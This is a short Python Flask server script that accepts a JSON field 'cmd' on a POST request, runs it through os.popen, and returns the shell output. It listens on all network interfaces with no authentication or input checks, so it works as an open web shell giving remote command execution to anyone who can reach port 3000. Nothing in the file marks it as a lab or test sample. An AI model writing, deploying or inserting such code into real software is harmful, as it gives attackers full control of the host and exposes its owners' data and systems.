from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/', methods=['POST'])
def run_command():
    data = request.get_json()
    cmd = data.get("cmd")
    result = os.popen(cmd).read()
    return {"output": result}, 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000)